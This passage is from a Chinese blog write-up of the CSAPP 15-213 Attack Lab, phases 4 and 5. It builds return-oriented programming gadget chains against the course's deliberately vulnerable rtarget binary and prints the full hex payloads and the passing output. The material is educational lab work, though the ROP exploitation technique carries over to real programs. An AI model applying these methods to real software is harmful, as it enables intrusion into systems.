&lt;p&gt;&lt;img data-src=&#34;/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/frame-last.png&#34; alt=&#34;frame-last.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;由此，输入的攻击字符串的前 40 个字节随意，后面 32 个字节根据上述栈情况为（注意应该用小端法）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;刚刚差点把 gadget1 和 2 的地址搞反了，导致跑出来 segmentation fault，还疑惑是怎么回事，后来一看发现不好，哈哈哈哈，做题的时候还是要认真仔细嗷！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;输入&lt;code&gt;./hex2raw &amp;lt; phase4.txt | ./rtarget -q&lt;/code&gt;（注意不要输入成&lt;code&gt;ctarget&lt;/code&gt;啦！），运行结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;gwen@gwen-virtual-machine:~/Documents/report/code/15213/lab/lab3-attack-lab$ ./hex2raw &amp;lt; phase4.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;Phase-5&#34;&gt;&lt;a href=&#34;#Phase-5&#34; class=&#34;headerlink&#34; title=&#34;Phase 5&#34;&gt;&lt;/a&gt;Phase 5&lt;/h3&gt;&lt;p&gt;phase 5 的任务是让&lt;code&gt;%rdi&lt;/code&gt;指向&lt;code&gt;cookie&lt;/code&gt;的字符串表示并调用&lt;code&gt;touch 3&lt;/code&gt;，这个任务看起来有点类似我们在 Phase 3 中做的工作。&lt;/p&gt;
&lt;p&gt;作者提示：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;可使用的&lt;code&gt;gadget&lt;/code&gt;的范围是&lt;code&gt;start_farm&lt;/code&gt;到&lt;code&gt;end_farm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;利用 Appendix 中的表&lt;/li&gt;
&lt;li&gt;复习一下课本 P83 的&lt;code&gt;movl&lt;/code&gt;的用法&lt;/li&gt;
&lt;li&gt;官方答案使用了 8 个 gadget&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在 Phase 3 中我们所做的工作是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;插入攻击字符串在攻击代码前&lt;/li&gt;
&lt;li&gt;在返回地址处插入攻击代码的起始位置&lt;/li&gt;
&lt;li&gt;在攻击代码中实现如下操作：&lt;ol&gt;
&lt;li&gt;将攻击字符串的地址赋值给&lt;code&gt;%rdi&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;将&lt;code&gt;touch3&lt;/code&gt;的返回地址压入返回地址处&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;现在使用&lt;code&gt;rop&lt;/code&gt;后的问题在于：攻击字符串压到哪？现在栈上是返回地址和字符串的组合。那么我们的想法是让攻击字符串放在所有 gadget 地址之后。但是具体放在之后多少呢？这要看&lt;code&gt;mov xxx, %rdi&lt;/code&gt;中哪些地址的编码存在。&lt;/p&gt;
&lt;p&gt;首先，&lt;code&gt;cookie&lt;/code&gt;的值是&lt;code&gt;59b997fa&lt;/code&gt;，那么其字符串编码是&lt;code&gt;0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61 0x00&lt;/code&gt;(&lt;code&gt;0x00&lt;/code&gt;是字符串最后的&lt;code&gt;\0&lt;/code&gt;)。那么我们构建的&lt;code&gt;gadget&lt;/code&gt;中应有的步骤是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;mov 地址,%rdi&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ret&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;此外，&lt;code&gt;touch3&lt;/code&gt;的地址是&lt;code&gt;0x4018fa&lt;/code&gt;。那么我们最初设计的栈空间如图：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/phase5.png&#34; alt=&#34;phase5.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是我后来有点卡壳了，问题在于把字符串存在什么位置呢？如果存在那个位置，在&lt;code&gt;rtarget&lt;/code&gt;汇编中能找到对应的&lt;code&gt;gadget&lt;/code&gt;吗？于是我查找了&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTA0MTgwNTM=&#34;&gt;一点资料&lt;/span&gt;(有点耍赖了对不起对不起~)，这个资料中提到的一条信息是我没有想到的：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;rtarget 相比 ctarget 的区别在于开启了栈随机化。也就是运行时字符串的地址是不确定的。在 phase 3 中我们所做的工作是刚好将其压在&lt;code&gt;test&lt;/code&gt;函数的返回地址下面，但是这里我们需要其相对与栈顶的地址。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;因此，我们应该做的步骤是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. 将攻击字符串放在%rsp + offset 处
2. 让 %rdi = %rsp + offset
3. ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;那么如何计算这个地址，并且将其赋给&lt;code&gt;%rdi&lt;/code&gt;呢？这个地址的计算需要在&lt;code&gt;%rsp&lt;/code&gt;的基础上偏移几十个字节。地址的计算我们可以使用&lt;code&gt;lea&lt;/code&gt;指令，然而加法运算如何实现呢？我们看看代码中有没有提供：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;/* Add two arguments */
long add_xy(long x, long y)
&amp;#123;
    return x+y;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这段代码的汇编格式如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00000000004019d6 &amp;lt;add_xy&amp;gt;:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其把&lt;code&gt;%rdi&lt;/code&gt;和&lt;code&gt;%rsi&lt;/code&gt;累加到&lt;code&gt;%rax&lt;/code&gt;中，那么我们要计算偏移量，需要分别把&lt;code&gt;%rsp&lt;/code&gt;和偏移量放到&lt;code&gt;%rsi&lt;/code&gt;和&lt;code&gt;%rdi&lt;/code&gt;中。最后让&lt;code&gt;%rdi = rax&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;rtarget&lt;/code&gt;中，与&lt;code&gt;%rsp&lt;/code&gt;相关的字节有&lt;code&gt;48 89 e0&lt;/code&gt;，其编码为&lt;code&gt;movq %rsp,%rax&lt;/code&gt;。和&lt;code&gt;%esp&lt;/code&gt;相关的字节有&lt;code&gt;89 e0&lt;/code&gt;，其编码为&lt;code&gt;movl %esp, %eax&lt;/code&gt;。包含这段编码的代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0000000000401a03 &amp;lt;addval_190&amp;gt;:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq

0000000000401a18 &amp;lt;getval_345&amp;gt;: // 不可取，c1不是单独指令
  401a18:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax
  401a1d:	c3                   	retq

0000000000401a39 &amp;lt;addval_110&amp;gt;:
  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax
  401a3f:	c3                   	retq

0000000000401a47 &amp;lt;addval_201&amp;gt;: // 不可取，c7不是单独指令
  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
  401a4d:	c3                   	retq

0000000000401a5a &amp;lt;setval_299&amp;gt;: // 不可取，91不是单独指令
  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
  401a60:	c3                   	retq

0000000000401a83 &amp;lt;addval_358&amp;gt;:
  401a83:	8d 87 08 89 e0 90    	lea    -0x6f1f76f8(%rdi),%eax
  401a89:	c3                   	retq

0000000000401a97 &amp;lt;setval_181&amp;gt;: // 不可取，c2不是单独指令
  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)
  401a9d:	c3                   	retq

0000000000401aab &amp;lt;setval_350&amp;gt;:
  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  401ab1:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;那么之前的过程就变为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. rax = rsp(48 89 e0)
2. rsi = 偏移量
3. rdi = rax(&amp;lt;setval_210&amp;gt; 中的 48 89 c7)
4. rax = rdi + rsi（lea指令）
5. rdi = rax(&amp;lt;setval_210&amp;gt; 中的 48 89 c7)
6. ret
7. 将攻击字符串放在%rsp + offset 处
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们找一下以&lt;code&gt;%rsi&lt;/code&gt;和&lt;code&gt;%rdi&lt;/code&gt;为目的寄存器的指令。&lt;/p&gt;
&lt;p&gt;以&lt;code&gt;%rdi&lt;/code&gt;为目的寄存器的指令编码有&lt;code&gt;(48)* 89 (c|d|e|f)(7|f)&lt;/code&gt;，在&lt;code&gt;rtarget&lt;/code&gt;中可能的代码段如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00000000004019a0 &amp;lt;addval_273&amp;gt;: // 不可取，c3不是指令
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq

00000000004019ae &amp;lt;setval_237&amp;gt;: // 不可取，c7不是指令
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq

00000000004019c3 &amp;lt;setval_426&amp;gt;: // 是他！是他！就是他！
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以&lt;code&gt;%rsi/%esi&lt;/code&gt;为目的寄存器的指令编码有&lt;code&gt;(48)* 89 (c|d|e|f)(6|e)&lt;/code&gt;。在&lt;code&gt;rtarget&lt;/code&gt;中可能的代码段如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00000000004019e8 &amp;lt;addval_113&amp;gt;: // 不可取，78 c9不是指令
  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax
  4019ee:	c3                   	retq

0000000000401a11 &amp;lt;addval_436&amp;gt;: // 可以是他！
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq

0000000000401a25 &amp;lt;addval_187&amp;gt;: // 可以是他，38 c0 是cmpb %al指令，不影响结果
  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
  401a2b:	c3                   	retq

0000000000401a61 &amp;lt;addval_404&amp;gt;: // 不可取，92 c3不是指令
  401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax
  401a67:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里没有&lt;code&gt;48&lt;/code&gt;，那么就只能输送到&lt;code&gt;%esi&lt;/code&gt;中。这里的难点在于如何把偏移量输送到&lt;code&gt;%esi&lt;/code&gt;中？这里肯定是不能直接输送了，必须通过寄存器的中转。这里只出现了&lt;code&gt;89 ce&lt;/code&gt;，通过查表我们可以发现&lt;code&gt;89 ce&lt;/code&gt;对应的指令是&lt;code&gt;movl %ecx, %esi&lt;/code&gt;。那么我们还需要想办法把值送到&lt;code&gt;%ecx&lt;/code&gt;中。那么前面的过程就变成了：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. rax = rsp(48 89 e0)
2. ecx = 偏移量； rsi = ecx(89 ce)
3. rdi = rax(&amp;lt;setval_210&amp;gt; 中的 48 89 c7)
4. rax = rdi + rsi（lea指令）
5. rdi = rax(&amp;lt;setval_210&amp;gt; 中的 48 89 c7)
6. ret
7. 将攻击字符串放在%rsp + offset 处
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们再来探测一下目的寄存器为&lt;code&gt;%ecx&lt;/code&gt;的相关指令，其格式为&lt;code&gt;(48)* 89 (c|d|e|f)(1|9)&lt;/code&gt;，包含其格式的代码段为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00000000004019f6 &amp;lt;getval_226&amp;gt;: // 不可取，48 c0不是指令
  4019f6:	b8 89 d1 48 c0       	mov    $0xc048d189,%eax
  4019fb:	c3                   	retq
0000000000401a33 &amp;lt;getval_159&amp;gt;: // 可取，38 c9 是cmpb %cl指令
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	retq
0000000000401a68 &amp;lt;getval_311&amp;gt;: // 可取，08 db 是orb %bl指令
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	retq
0000000000401a6e &amp;lt;setval_167&amp;gt;: // 不可取，91 c3 不是指令
  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
  401a74:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;代码段中以&lt;code&gt;%ecx&lt;/code&gt;为目的寄存器的代码格式为&lt;code&gt;89 d1&lt;/code&gt;，其转化为指令为&lt;code&gt;movl %edx, %ecx&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;那么前面的过程就变成了：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. rax = rsp(48 89 e0)
2. edx = 偏移量； ecx = edx；(89 d1) rsi = ecx(89 ce)
3. rdi = rax(&amp;lt;setval_210&amp;gt; 中的 48 89 c7)
4. rax = rdi + rsi（lea指令）
5. rdi = rax(&amp;lt;setval_210&amp;gt; 中的 48 89 c7)
6. ret
7. 将攻击字符串放在%rsp + offset 处
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们再来探测一下目的寄存器为&lt;code&gt;%edx&lt;/code&gt;的相关指令，其格式为&lt;code&gt;(48)* 89 (c|d|e|f)(2|a)&lt;/code&gt;，包含其格式的代码段为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00000000004019db &amp;lt;getval_481&amp;gt;: // 可以是他！
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq
0000000000401a1e &amp;lt;addval_479&amp;gt;: // 不可以是他！
  401a1e:	8d 87 89 c2 00 c9    	lea    -0x36ff3d77(%rdi),%eax
  401a24:	c3                   	retq
0000000000401a40 &amp;lt;addval_487&amp;gt;: // 可以是他，84 c0是 testb %al
  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
  401a46:	c3                   	retq
0000000000401a54 &amp;lt;getval_155&amp;gt;: // 不可以是他，c4 c9不是指令
  401a54:	b8 89 c2 c4 c9       	mov    $0xc9c4c289,%eax
  401a59:	c3                   	retq
0000000000401a8a &amp;lt;addval_124&amp;gt;: // 不可以是他，c7 37不是指令
  401a8a:	8d 87 89 c2 c7 3c    	lea    0x3cc7c289(%rdi),%eax
  401a90:	c3                   	retq
0000000000401a9e &amp;lt;addval_184&amp;gt;: // 不可以是他，60 d2不是指令
  401a9e:	8d 87 89 c2 60 d2    	lea    -0x2d9f3d77(%rdi),%eax
  401aa4:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;代码段中以&lt;code&gt;%edx&lt;/code&gt;为目的寄存器的代码格式为&lt;code&gt;89 c2&lt;/code&gt;，其转化为指令为&lt;code&gt;movl %eax, %edx&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;那么前面的过程就变成了：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. rax = rsp(48 89 e0)
2. eax = 偏移量；edx = eax；(89 c2) ecx = edx；(89 d1) rsi = ecx(89 ce)
3. rdi = rax(&amp;lt;setval_210&amp;gt; 中的 48 89 c7)
4. rax = rdi + rsi（lea指令）
5. rdi = rax(&amp;lt;setval_210&amp;gt; 中的 48 89 c7)
6. ret
7. 将攻击字符串放在%rsp + offset 处
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以&lt;code&gt;%eax&lt;/code&gt;(或&lt;code&gt;%rax&lt;/code&gt;)为目的寄存器的指令格式为&lt;code&gt;(48)* 89 (c|d|e|f)(0|8)&lt;/code&gt;，包含其格式的代码段为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0000000000401a03 &amp;lt;addval_190&amp;gt;:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq
0000000000401a18 &amp;lt;getval_345&amp;gt;:
  401a18:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax
  401a1d:	c3                   	retq
0000000000401a39 &amp;lt;addval_110&amp;gt;:
  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax
  401a3f:	c3                   	retq
0000000000401a47 &amp;lt;addval_201&amp;gt;:
  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
  401a4d:	c3                   	retq
0000000000401a5a &amp;lt;setval_299&amp;gt;:
  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
  401a60:	c3                   	retq
0000000000401a83 &amp;lt;addval_358&amp;gt;:
  401a83:	8d 87 08 89 e0 90    	lea    -0x6f1f76f8(%rdi),%eax
  401a89:	c3                   	retq
0000000000401a97 &amp;lt;setval_181&amp;gt;:
  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)
  401a9d:	c3                   	retq
0000000000401aab &amp;lt;setval_350&amp;gt;:
  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  401ab1:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中以&lt;code&gt;%eax&lt;/code&gt;为目的寄存器的代码格式为&lt;code&gt;89 e0&lt;/code&gt;，其主要目的为&lt;code&gt;movl %esp,%eax&lt;/code&gt;，也就是我们步骤第一步中的内容。&lt;/p&gt;
&lt;p&gt;除此以外，还有一种涉及&lt;code&gt;%rax&lt;/code&gt;的指令就是&lt;code&gt;popq %rax&lt;/code&gt;，其指令编码为&lt;code&gt;58&lt;/code&gt;。其在代码中出现的部分包含：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00000000004019a7 &amp;lt;addval_219&amp;gt;: // 可以是他！
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq
00000000004019b5 &amp;lt;setval_424&amp;gt;: // 92不是指令，不可以是他！
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq
00000000004019ca &amp;lt;getval_280&amp;gt;: // c3不是指令，不可以是他！
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;那么我们可以采取的方式是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. rax = rsp(48 89 e0)
2. 偏移量存储在栈上；popq %eax；edx = eax；(89 c2) ecx = edx；(89 d1) rsi = ecx(89 ce)
3. rdi = rax(&amp;lt;setval_210&amp;gt; 中的 48 89 c7)
4. rax = rdi + rsi（lea指令）
5. rdi = rax(&amp;lt;setval_210&amp;gt; 中的 48 89 c7)
6. ret
7. 将攻击字符串放在%rsp + offset 处
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但是现在问题来了，&lt;code&gt;%rax&lt;/code&gt;既要存储偏移量，又要存储&lt;code&gt;%rsp&lt;/code&gt;，我们能否换个地方存储&lt;code&gt;%rsp&lt;/code&gt;呢，其实可以把第 2 步和第 3 步换一下，让&lt;code&gt;%rax&lt;/code&gt;转储到&lt;code&gt;%rdi&lt;/code&gt;里去就行。最终步骤如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. rax = rsp(48 89 e0)
2. rdi = rax(&amp;lt;setval_210&amp;gt; 中的 48 89 c7)
3. 偏移量存储在栈上；popq %eax；edx = eax；(89 c2) ecx = edx；(89 d1) rsi = ecx(89 ce)
4. rax = rdi + rsi（lea指令）
5. rdi = rax(&amp;lt;setval_210&amp;gt; 中的 48 89 c7)
6. ret
7. 将攻击字符串放在%rsp + offset 处
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中&lt;code&gt;gadget&lt;/code&gt;的地址为：(单独的 gadget 地址见前文)&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;rax = rsp&lt;/code&gt; -&amp;gt; &lt;code&gt;401a06&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rdi = rax&lt;/code&gt; -&amp;gt; &lt;code&gt;4019c5&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;popq %eax&lt;/code&gt; -&amp;gt; &lt;code&gt;4019ab&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;偏移量存储在栈上&lt;/li&gt;
&lt;li&gt;&lt;code&gt;edx = eax&lt;/code&gt; -&amp;gt; &lt;code&gt;4019dd&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ecx = edx&lt;/code&gt; -&amp;gt; &lt;code&gt;401a69&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rsi = ecx&lt;/code&gt; -&amp;gt; &lt;code&gt;401a13&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rax = rdi + rsi&lt;/code&gt; -&amp;gt; &lt;code&gt;4019d6&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rdi = rax&lt;/code&gt; -&amp;gt; &lt;code&gt;4019c5&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;touch3&lt;/code&gt;地址 -&amp;gt; &lt;code&gt;4018fa&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;因为在执行第一条&lt;code&gt;rax = rsp&lt;/code&gt;时，已经执行了一次&lt;code&gt;ret&lt;/code&gt;指令，因此此时&lt;code&gt;%rsp&lt;/code&gt;在&lt;code&gt;buf + 48&lt;/code&gt;处，也就是返回地址已经被弹出了一个。所以在&lt;code&gt;buf + 48&lt;/code&gt;后面是 9 个地址 + 数据，因此偏移量应该是 &lt;code&gt;9 * 8 = 72&lt;/code&gt;，转化为 16 进制就是&lt;code&gt;0x48&lt;/code&gt;。最终的栈结构如下：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/phase5-last.png&#34; alt=&#34;phase5-last.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;因此，phase 5 的输入为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
ab 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
69 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最终结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;Cookie: 0x59b997fa
Type string:Touch3!: You called touch3(&amp;quot;59b997fa&amp;quot;)
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 69 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过！&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;&lt;a href=&#34;#总结&#34; class=&#34;headerlink&#34; title=&#34;总结&#34;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;phase 1 很简单，让 buffer overflow 溢出，然后覆盖返回地址即可&lt;/li&gt;
&lt;li&gt;phase 2 需要让&lt;code&gt;%rdi&lt;/code&gt;的值等于&lt;code&gt;cookie&lt;/code&gt;的值，我们需要插入一部分自己的攻击代码，比 Phase 1 难度稍微高点&lt;/li&gt;
&lt;li&gt;phase 3 中我们需要插入自己的攻击字符串，然后让&lt;code&gt;ret&lt;/code&gt;指令返回到攻击代码开始处，通过指令将&lt;code&gt;%rdi&lt;/code&gt;的值设置为攻击字符串的地址，并且把&lt;code&gt;touch3&lt;/code&gt;的地址压到栈上。这里的难点在于&lt;code&gt;hexmatch&lt;/code&gt;和&lt;code&gt;strncmp&lt;/code&gt;中出现了&lt;code&gt;push&lt;/code&gt;的压栈操作，并且使用了一段随机的 buffer，如果把攻击字符串放在攻击代码之前，会导致攻击字符串被破坏。因此这里的核心是把攻击字符串放在 caller 函数(&lt;code&gt;test&lt;/code&gt;)的栈空间内（在返回地址下面），然后让&lt;code&gt;%rdi&lt;/code&gt;指向这里&lt;/li&gt;
&lt;li&gt;phase 4 &amp;amp; phase 5 的难点在于将过程理清楚，并且在&lt;code&gt;rtarget&lt;/code&gt;中找到对应的&lt;code&gt;gadget&lt;/code&gt;，将栈上作为&lt;code&gt;gadget&lt;/code&gt;地址和数值的组合，巧妙地运用&lt;code&gt;popq&lt;/code&gt;和&lt;code&gt;ret&lt;/code&gt;和其他指令组合出我们想要的操作。&lt;/li&gt;
&lt;li&gt;phase 5 的核心在于首先确定&lt;code&gt;rax = rdi + rsi&lt;/code&gt;，并且这两个寄存器一个存储&lt;code&gt;%rsp&lt;/code&gt;，一个存储偏移量。要将数据输入到这两个寄存器，随后不断的通过反推，找到以他们为目标地址的指令通用结构，在&lt;code&gt;rtarget&lt;/code&gt;中查找到相关指令，然后确定其源寄存器。再来反推什么指令能将数据输送到源寄存器。打通一条通路，然后确定每个 gadget 的地址，最后串联起来就是我们想要的 gadget 列表！这个过程收获很大！&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;虽然做这 5 个 Phase 的过程不容易，但是总体来说受益匪浅！&lt;/p&gt;
&lt;h2 id=&#34;参考资料&#34;&gt;&lt;a href=&#34;#参考资料&#34; class=&#34;headerlink&#34; title=&#34;参考资料&#34;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MDcyNDk0OA==&#34;&gt;CSAPP 实验之 attack lab&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NzYzOTY0NjU=&#34;&gt;CSAPP | Lab3-Attack Lab 深入解析&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTA0MTgwNTM=&#34;&gt;csapp-attacklab 详解&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
        <updated>2024-02-29T02:36:22.000Z</updated>
    </entry>
    <entry>
